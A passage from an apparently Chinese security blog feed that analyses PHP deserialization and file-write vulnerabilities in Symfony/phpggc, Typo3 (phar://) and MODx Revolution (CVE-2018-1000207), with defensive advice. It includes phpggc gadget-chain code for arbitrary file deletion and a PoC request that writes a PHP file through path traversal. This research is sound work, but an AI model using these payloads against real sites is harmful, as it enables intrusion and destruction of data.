&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539052263375.png&#34; alt=&#34;1539052263375&#34; /&gt;&lt;/p&gt;

&lt;p&gt;需要提供远程文件路径和本地文件路径两个参数&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539052815893.png&#34; alt=&#34;1539052815893&#34; /&gt;&lt;/p&gt;

&lt;p&gt;接着还是拼接和转义，并import数据&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539052742894.png&#34; alt=&#34;1539052742894&#34; /&gt;&lt;/p&gt;

&lt;p&gt;写入的是整个json字符串，但是不影响代码执行。&lt;/p&gt;

&lt;h4 id=&#34;3-任意文件删除&#34;&gt;3.  任意文件删除&lt;/h4&gt;

&lt;p&gt;另一个类是&lt;code&gt;WindowsPipes&lt;/code&gt;，路径&lt;code&gt;vendor/symfony/process/Pipes/WindowsPipes.php&lt;/code&gt;，该类可以造成文件删除&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539053196182.png&#34; alt=&#34;1539053196182&#34; /&gt;&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;phpggc&lt;/code&gt;中没有内置这个类，于是我们按照这个工具的框架来实现一下，方便理解该工具。&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;lib/PHPGGC/GadgetChain.php&lt;/code&gt;已经有&lt;code&gt;TYPE_FD&lt;/code&gt;这个类型，代表&lt;code&gt;file_delete&lt;/code&gt;，那么我们直接在&lt;code&gt;lib/PHPGGC/GadgetChain/&lt;/code&gt;注册一个&lt;code&gt;FileDelete&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

namespace PHPGGC\GadgetChain;

abstract class FileDelete extends \PHPGGC\GadgetChain
{
    public static $type = self::TYPE_FD;
    public $parameters = [
        &#39;file_name&#39;
    ];
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个类就可以作为POP链拿来使用了&lt;/p&gt;

&lt;p&gt;然后在&lt;code&gt;Symfony&lt;/code&gt;目录下创建&lt;code&gt;RMF/1&lt;/code&gt;，并创建&lt;code&gt;chain&lt;/code&gt;和&lt;code&gt;gadgets&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;gadgetchains/Symfony/RMF/1/chain.php&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

namespace GadgetChain\Symfony;

class RMF1 extends \PHPGGC\GadgetChain\FileDelete
{
    public $version = &#39;2.6 &amp;lt;= 2.8.32&#39;;
    public $vector = &#39;__destruct&#39;;
    public $author = &#39;crlf&#39;;
    public $informations = &#39;Remove remote file.&#39;;

    public function generate(array $parameters)
    {
        $input = $parameters[&#39;file_name&#39;];

        return new \Symfony\Component\Process\Pipes\WindowsPipes($input);
    }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;gadgetchains/Symfony/RMF/1/gadgets.php&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

namespace Symfony\Component\Process\Pipes;


class WindowsPipes
{
    private $files = array();

    public function __construct($input)
    {
        $this-&amp;gt;files = array($input);
    }

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们直接生成&lt;code&gt;WindowsPipes&lt;/code&gt;的序列化数据，把文件名作为参数传入，在反序列化的时候自动调用&lt;code&gt;removeFiles()&lt;/code&gt;，实现任意文件删除&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539053814915.png&#34; alt=&#34;1539053814915&#34; /&gt;&lt;/p&gt;

&lt;p&gt;生成序列化字符串&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539053942995.png&#34; alt=&#34;1539053942995&#34; /&gt;&lt;/p&gt;

&lt;p&gt;import后文件被删除&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539054380813.png&#34; alt=&#34;1539054380813&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;四-总结&#34;&gt;四、总结&lt;/h3&gt;

&lt;p&gt;通过这个漏洞对&lt;code&gt;phpgcc&lt;/code&gt;工具有了一定了解，我们可以添加自定义&lt;code&gt;POP&lt;/code&gt;链到工具中，用来丰富这个武器库。&lt;/p&gt;

&lt;p&gt;另外针对这个漏洞，文件写入和文件删除都需要知道网站的绝对路径，加上需要登录后才能利用，一定程度上加大了利用难度。&lt;/p&gt;

&lt;h2 id=&#34;0x03-typo3反序列化漏洞&#34;&gt;0x03 Typo3反序列化漏洞&lt;/h2&gt;

&lt;h3 id=&#34;一-介绍-1&#34;&gt;一、介绍&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;Typo3&lt;/code&gt;也是一款著名的CMS，但是在国内流行程度不如&lt;code&gt;Wordpress&lt;/code&gt;。这个漏洞是今年&lt;code&gt;BlackHat&lt;/code&gt;大会上由&lt;code&gt;Sam Thomas&lt;/code&gt;分享反序列化漏洞议题时作为案例来讲的，该漏洞由&lt;code&gt;phar://&lt;/code&gt;触发，这是一个新型的反序列化利用方式，日常开发中容易忽略这个风险点，在漏洞利用中也用到了&lt;code&gt;phpgcc&lt;/code&gt;这个工具，所以一并学习。&lt;/p&gt;

&lt;p&gt;关于该漏洞的官方描述，可以看&lt;a href=&#34;https://typo3.org/security/advisory/typo3-core-sa-2018-002/&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;二-phar-介绍&#34;&gt;二、phar://介绍&lt;/h3&gt;

&lt;p&gt;在分析漏洞前先介绍一下&lt;code&gt;phar://&lt;/code&gt;伪协议，直接看php手册的&lt;a href=&#34;http://php.net/manual/en/intro.phar.php&#34;&gt;介绍&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Phar archives are best characterized as a convenient way to group several files into a single file. As such, a phar archive provides a way to distribute a complete PHP application in a single file and run it from that file without the need to extract it to disk. Additionally, phar archives can be executed by PHP as easily as any other file, both on the commandline and from a web server. Phar is kind of like a thumb drive for PHP applications.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;简单来说&lt;code&gt;phar&lt;/code&gt;就是&lt;code&gt;php&lt;/code&gt;压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被php访问并执行，与&lt;code&gt;file://&lt;/code&gt; &lt;code&gt;php://&lt;/code&gt;等类似，也是一种流包装器。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;phar&lt;/code&gt;结构由4部分组成&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;stub&lt;/code&gt;  phar文件标识，格式为 &lt;code&gt;xxx&amp;lt;?php xxx; __HALT_COMPILER();?&amp;gt;；&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;manifest&lt;/code&gt;  压缩文件的属性等信息，以&lt;strong&gt;序列化&lt;/strong&gt;存储；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;contents&lt;/code&gt;  压缩文件的内容；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;signature&lt;/code&gt;  签名，放在文件末尾；&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里有两个关键点，一是文件标识，必须以&lt;code&gt;__HALT_COMPILER();?&amp;gt;&lt;/code&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者&lt;code&gt;pdf&lt;/code&gt;文件来绕过一些上传限制；二是反序列化，&lt;code&gt;phar&lt;/code&gt;存储的&lt;code&gt;meta-data&lt;/code&gt;信息以序列化方式存储，当文件操作函数通过&lt;code&gt;phar://&lt;/code&gt;伪协议解析&lt;code&gt;phar&lt;/code&gt;文件时就会将数据反序列化，而这样的文件操作函数有很多，包括下面这些：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539063733837.png&#34; alt=&#34;1539063733837&#34; /&gt;&lt;/p&gt;

&lt;p&gt;图片来自&lt;a href=&#34;https://paper.seebug.org/680/&#34;&gt;seebug&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;这中间大多数是常用的函数，在一个系统中使用相当广泛，结合文件伪造，使得通过&lt;code&gt;phar://&lt;/code&gt;解析造成的反序列化攻击变得愈加容易。&lt;/p&gt;

&lt;h3 id=&#34;三-漏洞分析&#34;&gt;三、漏洞分析&lt;/h3&gt;

&lt;p&gt;接下来看一下Typo3中存在漏洞的代码&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;typo3/sysext/core/Classes/Database/SoftReferenceIndex.php&lt;/code&gt;的&lt;code&gt;getTypoLinkParts()&lt;/code&gt;方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539064169518.png&#34; alt=&#34;1539064169518&#34; /&gt;&lt;/p&gt;

&lt;p&gt;上面说到存在风险的文件操作函数，其中就包括&lt;code&gt;file_exists()&lt;/code&gt;，当传给&lt;code&gt;file_exists()&lt;/code&gt;的参数是&lt;code&gt;phar&lt;/code&gt;压缩文档并通过&lt;code&gt;phar://&lt;/code&gt;伪协议解析时，就会反序列化其中的&lt;code&gt;metadata&lt;/code&gt;数据，一旦该数据被控制，就会形成漏洞。&lt;/p&gt;

&lt;p&gt;下面举一个例子演示&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539064567894.png&#34; alt=&#34;1539064567894&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539064633273.png&#34; alt=&#34;1539064633273&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到通过&lt;code&gt;file_exists()&lt;/code&gt;函数判断文件是否存在即对&lt;code&gt;TestObject&lt;/code&gt;类进行了反序列化。&lt;/p&gt;

&lt;p&gt;那么我们可以构造&lt;code&gt;$splitLinkParam&lt;/code&gt;参数为&lt;code&gt;phar&lt;/code&gt;文件，其中包含恶意代码，传递给&lt;code&gt;file_exists()&lt;/code&gt;函数，便会触发漏洞。&lt;/p&gt;

&lt;h3 id=&#34;四-漏洞利用&#34;&gt;四、漏洞利用&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/s-n-t/phpggc&#34;&gt;pharggc&lt;/a&gt;是在&lt;code&gt;phpgcc&lt;/code&gt;的基础上增加了对&lt;code&gt;phar&lt;/code&gt;的支持，能够将序列化后的&lt;code&gt;payload&lt;/code&gt;写入到&lt;code&gt;phar&lt;/code&gt;文件中，通过&lt;code&gt;phar://&lt;/code&gt;解析时触发&lt;code&gt;payload&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;我们已经找到可以触发漏洞的地方，但还需要一个类来执行代码，在Typo3中同样存在&lt;code&gt;FnStream&lt;/code&gt;类，所以我们还是使用&lt;code&gt;guzzle/rce1&lt;/code&gt;载荷将数据写入一张图片中&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539065928944.png&#34; alt=&#34;1539065928944&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539065937046.png&#34; alt=&#34;1539065937046&#34; /&gt;&lt;/p&gt;

&lt;p&gt;然后上传这个附件，接着创建一个页面，将Link设置为&lt;code&gt;phar://&lt;/code&gt;，注意需要将&lt;code&gt;:&lt;/code&gt;转义&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539067380611.png&#34; alt=&#34;1539067380611&#34; /&gt;&lt;/p&gt;

&lt;p&gt;保存后就会触发漏洞&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539067384583.png&#34; alt=&#34;1539067384583&#34; /&gt;&lt;/p&gt;

&lt;p&gt;调用栈如下图所示&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539070664504.png&#34; alt=&#34;1539070664504&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;五-总结及防御&#34;&gt;五、总结及防御&lt;/h3&gt;

&lt;p&gt;这个漏洞利用的是&lt;code&gt;phar&lt;/code&gt;的特性，在系统未过滤&lt;code&gt;phar://&lt;/code&gt;协议且参数可以控制时，容易引发漏洞，开发时也需要多注意限制使用不必要的流包装器，上传文件也要校验文件内容而不仅仅是文件头。&lt;/p&gt;

&lt;p&gt;防范措施&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;限制PHP流包装器的使用(传递)；&lt;/li&gt;
&lt;li&gt;控制文件操作函数的参数，过滤特殊字符，例如 phar:// 等；&lt;/li&gt;
&lt;li&gt;仅在特别请求时才对元数据进行反序列化；&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h2&gt;

&lt;p&gt;本文分析了两个漏洞，并结合&lt;code&gt;phpggc&lt;/code&gt;工具梳理了反序列化漏洞常见的攻击方式，以及如何寻找一条可以利用的POP链，也提到了开发中容易忽略的安全风险，希望能给大家起到帮助。&lt;/p&gt;

&lt;p&gt;参考：&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/334/&#34;&gt;https://paper.seebug.org/334/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/680&#34;&gt;https://paper.seebug.org/680&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ambionics/phpggc&#34;&gt;https://github.com/ambionics/phpggc&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/s-n-t/phpggc&#34;&gt;https://github.com/s-n-t/phpggc&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://php.net/manual/en/function.yaml-parse.php&#34;&gt;http://php.net/manual/en/function.yaml-parse.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://php.net/manual/en/intro.phar.php&#34;&gt;http://php.net/manual/en/intro.phar.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple&#34;&gt;https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://typo3.org/security/advisory/typo3-core-sa-2018-002/&#34;&gt;https://typo3.org/security/advisory/typo3-core-sa-2018-002/&lt;/a&gt;&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>MODx Revolution 远程代码执行漏洞分析</title>
      <link>https://kylingit.com/blog/modx-revolution-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
      <pubDate>Fri, 20 Jul 2018 17:44:56 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/modx-revolution-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;

&lt;p&gt;近日，&lt;code&gt;MODx&lt;/code&gt;官方发布通告称其&lt;code&gt;MODx Revolution 2.6.4&lt;/code&gt;及之前的版本存在2个高危漏洞，攻击者可以通过该漏洞远程执行任意代码，从而获取网站的控制权或者删除任意文件。 本文分析其中的&lt;strong&gt;CVE-2018-1000207&lt;/strong&gt;漏洞，并分别分析MODx 2.5.1和2.6.4版本漏洞形成原因和PoC构造。&lt;/p&gt;

&lt;h3 id=&#34;0x02-环境搭建&#34;&gt;0x02 环境搭建&lt;/h3&gt;

&lt;p&gt;分别安装&lt;code&gt;MODx 2.5.1&lt;/code&gt;和&lt;code&gt;2.6.4&lt;/code&gt;版本&lt;/p&gt;

&lt;h3 id=&#34;0x03-漏洞分析&#34;&gt;0x03 漏洞分析&lt;/h3&gt;

&lt;h4 id=&#34;2-5-1版本&#34;&gt;2.5.1版本&lt;/h4&gt;

&lt;p&gt;漏洞发生在&lt;code&gt;phpthumb&lt;/code&gt;模块，该模块的作用是提供缩略图对象&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1532080364911.png&#34; alt=&#34;1532080364911&#34; /&gt;&lt;/p&gt;

&lt;p&gt;当我们把光标放到文件系统中的图片上的时候，可以看到弹出了图片的缩略图，此时就调用了&lt;code&gt;phpthumb&lt;/code&gt;接口&lt;/p&gt;

&lt;p&gt;请求接口类似这样&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://127.0.0.1/connectors/system/phpthumb.php?src=1.png&amp;amp;w=116&amp;amp;h=0&amp;amp;HTTP_MODAUTH=modx5b5067d920ba81.94108199_15b513c49743c49.16917110&amp;amp;f=png&amp;amp;q=90&amp;amp;wctx=mgr&amp;amp;source=1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;可以看到几个参数描述了图片的一些基本属性，这些属性在&lt;code&gt;core/model/phpthumb/phpthumb.class.php&lt;/code&gt;中定义&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;// public:
// START PARAMETERS (for object mode and phpThumb.php)
// See phpthumb.readme.txt for descriptions of what each of these values are
var $src  = null;     // SouRCe filename
var $new  = null;     // NEW image (phpThumb.php only)
var $w    = null;     // Width
var $h    = null;     // Height
var $wp   = null;     // Width  (Portrait Images Only)
var $hp   = null;     // Height (Portrait Images Only)
var $wl   = null;     // Width  (Landscape Images Only)
var $hl   = null;     // Height (Landscape Images Only)

// private: (should not be modified directly)
var $sourceFilename   = null;
var $rawImageData     = null;
var $IMresizedData    = null;
var $outputImageData  = null;
var $useRawIMoutput   = false;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从定义中也能看到，&lt;code&gt;phpthumb&lt;/code&gt;提供了两种类型的参数：&lt;code&gt;public&lt;/code&gt;和&lt;code&gt;private&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;public&lt;/code&gt;就是普通属性，包括图片长宽高等，&lt;code&gt;private&lt;/code&gt;则是一些私有属性，包括缓存目录，文件类型等，此次漏洞形成的关键就是程序并没有对两种类型的参数区分处理，以至于我们可以直接传入私有参数控制其中的变量值，从而改变程序执行逻辑。&lt;/p&gt;

&lt;p&gt;当我们请求这个接口的时候，会访问&lt;code&gt;modSystemPhpThumbProcessor()&lt;/code&gt;类，其中的&lt;code&gt;process()&lt;/code&gt;方法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public function process() {
    $src = $this-&amp;gt;getProperty(&#39;src&#39;);
    if (empty($src)) return $this-&amp;gt;failure();

    $this-&amp;gt;unsetProperty(&#39;src&#39;);

    $this-&amp;gt;getSource($this-&amp;gt;getProperty(&#39;source&#39;));
    if (empty($this-&amp;gt;source)) $this-&amp;gt;failure($this-&amp;gt;modx-&amp;gt;lexicon(&#39;source_err_nf&#39;));

    $src = $this-&amp;gt;source-&amp;gt;prepareSrcForThumb($src);
    if (empty($src)) return &#39;&#39;;

    $this-&amp;gt;loadPhpThumb();
    /* set source and generate thumbnail */
    $this-&amp;gt;phpThumb-&amp;gt;set($src);

    /* check to see if there&#39;s a cached file of this already */
    if ($this-&amp;gt;phpThumb-&amp;gt;checkForCachedFile()) {
        $this-&amp;gt;phpThumb-&amp;gt;loadCache();
        return &#39;&#39;;
    }

    /* generate thumbnail */
    $this-&amp;gt;phpThumb-&amp;gt;generate();

    /* cache the thumbnail and output */
    $this-&amp;gt;phpThumb-&amp;gt;cache();
    $this-&amp;gt;phpThumb-&amp;gt;output();
    return &#39;&#39;;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到里面的几个主要操作，包括检查文件是否被缓存，以及读取缓存，设置缓存等，我们利用的就是&lt;code&gt;phpthumb&lt;/code&gt;设置缓存的方法&lt;code&gt;phpThumb-&amp;gt;cache()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public function cache() {
    phpthumb_functions::EnsureDirectoryExists(dirname($this-&amp;gt;cache_filename));
    if ((file_exists($this-&amp;gt;cache_filename) &amp;amp;&amp;amp; is_writable($this-&amp;gt;cache_filename)) || is_writable(dirname($this-&amp;gt;cache_filename))) {
        $this-&amp;gt;CleanUpCacheDirectory();
        if ($this-&amp;gt;RenderToFile($this-&amp;gt;cache_filename) &amp;amp;&amp;amp; is_readable($this-&amp;gt;cache_filename)) {
            chmod($this-&amp;gt;cache_filename, 0644);
            $this-&amp;gt;RedirectToCachedFile();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里面关键的方法是&lt;code&gt;RenderToFile()&lt;/code&gt;，可以看到它接收参数&lt;code&gt;$this-&amp;gt;cache_filename&lt;/code&gt;，那么我们可以直接传入&lt;code&gt;cache_filename&lt;/code&gt;这个变量值。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function RenderToFile($filename) {
    $renderfilename = $filename;
    //一系列检查
    if ($this-&amp;gt;RenderOutput()) {
        if (file_put_contents($renderfilename, $this-&amp;gt;outputImageData)) {
            $this-&amp;gt;DebugMessage(&#39;RenderToFile(&#39;.$renderfilename.&#39;) succeeded&#39;, __FILE__, __LINE__);
            return true;
        }
    //...
    return false;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;RenderToFile()&lt;/code&gt;方法里有&lt;code&gt;file_put_contents()&lt;/code&gt;函数，文件名是我们传入的&lt;code&gt;cache_filename&lt;/code&gt;，文件内容是&lt;code&gt;$this-&amp;gt;outputImageData&lt;/code&gt;。如果对内容没有校验的话意味着我们可以写入任意内容，前提是满足&lt;code&gt;$this-&amp;gt;RenderOutput()&lt;/code&gt;为真，进去看一下&lt;code&gt;RenderOutput()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function RenderOutput() {
    //...
    if ($this-&amp;gt;useRawIMoutput) {
        $this-&amp;gt;DebugMessage(&#39;RenderOutput copying $this-&amp;gt;IMresizedData (&#39;.strlen($this-&amp;gt;IMresizedData).&#39; bytes) to $this-&amp;gt;outputImage&#39;, __FILE__, __LINE__);
        $this-&amp;gt;outputImageData = $this-&amp;gt;IMresizedData;
        return true;
    }
    //...
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在这里我们需要满足&lt;code&gt;$this-&amp;gt;useRawIMoutput&lt;/code&gt;为真，而这个变量默认值为&lt;code&gt;false&lt;/code&gt;。实际上&lt;code&gt;useRawIMoutput&lt;/code&gt;即为我们提到的私有变量，程序虽然默认定义了私有变量的值，但我们还是可以通过&lt;code&gt;post&lt;/code&gt;把值直接传进去，同时这里也没有检验文件的内容，直接把&lt;code&gt;$this-&amp;gt;IMresizedData&lt;/code&gt;赋值为&lt;code&gt;$this-&amp;gt;outputImageData&lt;/code&gt;，也就是&lt;code&gt;file_put_contents()&lt;/code&gt;所需要的第二个参数，所以到这里就能构成一个任意文件写入的漏洞。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;构造PoC：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;cache_filename=../../../payload.php&amp;amp;src=.&amp;amp;ctx=web&amp;amp;useRawIMoutput=1&amp;amp;config_prefer_imagemagick=0&amp;amp;outputImageData=&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;需要特别注意的是，此处的&lt;code&gt;cache_filename&lt;/code&gt;与网站相对路径密切相关，往上目录穿越少了反而不能写入文件，而在Windows下测试可以写入Web根目录以外的目录，因为程序内部虽然检查了目录写权限，却并没有限制一个根目录，所以严格来说这里还存在一个目录穿越漏洞。&lt;/p&gt;

&lt;p&gt;这个利用在MODX 2.5.1版本及之前可以无需登录直接利用，而在2.6.4版本进行了更严格的权限检查，在处理请求之前增加了这样一段判断代码：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;core/model/modx/modconnectorresponse.class.php&lt;/code&gt; &lt;code&gt;outputContent()&lt;/code&gt;方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;/* Block the user if there&#39;s no user token for the current context, and permissions are in fact required */
if (empty($siteId) &amp;amp;&amp;amp; (!defined(&#39;MODX_REQP&#39;) || MODX_REQP === TRUE)) {
    $this-&amp;gt;responseCode = 401;
    $this-&amp;gt;body = $modx-&amp;gt;error-&amp;gt;failure($modx-&amp;gt;lexicon(&#39;access_denied&#39;),array(&#39;code&#39; =&amp;gt; 401));
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;所以在2.6.4版本利用需要登录权限。&lt;/p&gt;

&lt;h4 id=&#34;2-6-4版本&#34;&gt;2.6.4版本&lt;/h4&gt;

&lt;p&gt;那么有没有方法在2.6.4版本也能不需要权限直接写入任意文件呢？答案还是有的，只不过网站需要安装一个插件&lt;a href=&#34;https://modx.com/extras/package/gallery&#34;&gt;Gallery&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Gallery is a dynamic Gallery Extra for MODx Revolution. It allows you to quickly and easily put up galleries of images, sort them, tag them, and display them in a myriad of ways in the front-end of your site.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;简而言之&lt;code&gt;Gallery&lt;/code&gt; 是一个图库，可以更方便地管理网站图片。&lt;/p&gt;

&lt;p&gt;在这个库中也有&lt;code&gt;phpThumb&lt;/code&gt;的相关方法，而且同样有缓存机制，不出意外同样存在任意文件写入漏洞，但是这个方法稍微复杂一些，它把文件写入cache目录，而文件名经过了一个array的反序列化再MD5，这样即使我们能写入文件，却猜不到文件名，因此a2u给出的PoC也没能直接写入文件，而是通过返回包来判断是否存在漏洞。但是经过分析，实际上我们是可以往缓存目录写入一个shell的，而且能够知道保存的文件名，下面来分析一下如何绕过这个看似复杂的流程。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1532596628836.png&#34; alt=&#34;1532596628836&#34; /&gt;&lt;/p&gt;

&lt;p&gt;当利用插件上传图片的时候，如果图库中已经有图片，我们就可以看到一张缩略图，请求类似这样&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://127.0.0.1/modx-2.6.4-pl/assets/components/gallery/connector.php?action=web/phpthumb&amp;amp;w=100&amp;amp;h=100&amp;amp;zc=1&amp;amp;src=/modx-2.6.4-pl/assets/gallery/1/cover.png&amp;amp;time=1532596253635&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;同样的，&lt;code&gt;gallery&lt;/code&gt;的&lt;code&gt;connector.php&lt;/code&gt;也接收图片属性等&lt;code&gt;public&lt;/code&gt;参数，但是此处我们并不关心，直接定位到处理写入缓存的文件&lt;code&gt;core/components/gallery/processors/web/phpthumb.php&lt;/code&gt;。漏洞形成点同样也是&lt;code&gt;file_put_contents&lt;/code&gt;参数没有经过过滤。&lt;/p&gt;

&lt;p&gt;请求在进入&lt;code&gt;phpthumb.php&lt;/code&gt;之后，首先会把参数设置成一个&lt;code&gt;array&lt;/code&gt;，放在&lt;code&gt;$scriptProperties&lt;/code&gt;中，类似这样&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;array (
  &#39;action&#39; =&amp;gt; &#39;web/phpthumb&#39;,
  &#39;w&#39; =&amp;gt; &#39;100&#39;,
  &#39;h&#39; =&amp;gt; &#39;100&#39;,
  &#39;zc&#39; =&amp;gt; &#39;1&#39;,
  &#39;src&#39; =&amp;gt; &#39;/modx-2.6.4-pl/assets/gallery/1/cover.png&#39;,
  &#39;time&#39; =&amp;gt; &#39;1532596253635&#39;,
)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在调用系统&lt;code&gt;phpthumb.class.php&lt;/code&gt;模块的&lt;code&gt;RenderToFile&lt;/code&gt;之前对文件进行了一系列处理，主要关注其中几个&lt;/p&gt;

&lt;p&gt;首先对&lt;code&gt;src&lt;/code&gt;文件后缀有一个判断&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (empty($ptOptions[&#39;f&#39;])) {
    $ext = pathinfo($src, PATHINFO_EXTENSION);
    $ext = strtolower($ext);
    switch ($ext) {
        case &#39;jpg&#39;:
        case &#39;jpeg&#39;:
        case &#39;png&#39;:
        case &#39;gif&#39;:
        case &#39;bmp&#39;:
            $ptOptions[&#39;f&#39;] = $ext;
            break;
        default:
            $ptOptions[&#39;f&#39;] = &#39;jpeg&#39;;
            break;
    }
}
&lt;/code&gt;&lt;/pre&gt;

